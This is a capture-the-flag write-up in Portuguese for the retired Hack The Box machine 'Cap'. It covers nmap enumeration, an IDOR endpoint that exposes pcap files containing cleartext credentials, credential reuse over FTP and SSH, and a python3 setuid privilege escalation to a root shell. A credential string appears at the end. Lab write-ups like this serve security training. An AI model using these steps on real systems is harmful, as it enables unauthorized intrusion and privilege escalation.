# Hack The Box — Cap (Linux) - Writeup (Machine Retired)

## 1. Enumeration

Inicialmente foi realizado um scan de portas utilizando **Nmap**:

```bash
nmap -Pn -sS -T4 --max-rate 100 -p21,22,50,80,443,445 10.10.10.245
```

### Resultado

```text
PORT    STATE  SERVICE
21/tcp  open   ftp
22/tcp  open   ssh
80/tcp  open   http
```

Foram identificados três serviços ativos: **FTP**, **SSH** e **HTTP**.

---

## 1.1 Service Enumeration

Foi realizado um scan mais detalhado para identificar versões e informações adicionais dos serviços:

```bash
nmap -Pn -sS -sV -sC -p21,22,80 10.10.10.245
```

### Resultado relevante

- **FTP:** vsftpd 3.0.3  
- **SSH:** OpenSSH 8.2p1 (Ubuntu)  
- **HTTP:** Gunicorn (Python Web Server)

Essas informações indicam que a aplicação web provavelmente foi desenvolvida em **Python**, possivelmente utilizando **Flask**.

---

## 2. FTP Enumeration

Foram executados scripts de vulnerabilidade no serviço FTP:

```bash
nmap -Pn --script=ftp* -p21 10.10.10.245
```

Nenhuma vulnerabilidade conhecida foi identificada, e o brute force não retornou credenciais válidas.

---

## 3. Web Enumeration (HTTP)

Durante a enumeração da aplicação web, foi identificado um endpoint vulnerável a **IDOR (Insecure Direct Object Reference)**:

```text
http://10.10.10.245/data/{id}
```

Alterando o parâmetro `id`, foi possível baixar arquivos no formato **.pcap**.

Ao analisar os arquivos capturados, foram identificadas **credenciais em texto claro**, que permitiram o acesso ao serviço FTP.

---

## 4. Initial Access (Foothold)

Utilizando as credenciais obtidas no arquivo `.pcap`, foi possível:

- Autenticar no **FTP**
- Reutilizar as mesmas credenciais para acesso via **SSH**

Com isso, foi obtido acesso inicial ao sistema.

---

## 5. Post-Exploitation

Após o acesso via SSH, foi realizada enumeração local, incluindo:

- Análise do diretório `/var/www`
- Identificação de uma aplicação web em **Python/Flask**
- Identificação de uma rota vulnerável a **Command Injection**

Para aprofundar a enumeração, foi utilizado o **linPEAS**, que identificou configurações inseguras relacionadas a permissões e execução de Python.

---

## 6. Privilege Escalation

Foi identificado que o binário **python3** podia ser utilizado para escalar privilégios.

Ao iniciar um interpretador Python, foi possível alterar o UID do processo:

```bash
python3
```

```python
import os
os.setuid(0)
os.system("id")
```

### Resultado

```text
uid=0(root) gid=1001(user) groups=1001(user)
```

Em seguida, foi obtido um shell como **root**:

```python
os.system("sh")
```

Com isso, o controle total da máquina foi alcançado.

---

## 7. Conclusion

A exploração da máquina foi possível devido a uma combinação de fatores:

- Vulnerabilidade **IDOR**
- Exposição de credenciais sensíveis
- Reutilização de senha
- Configuração insegura permitindo **Privilege Escalation via Python**

---

### Request Argument

```text
Buck3tH4TF0RM3!
```

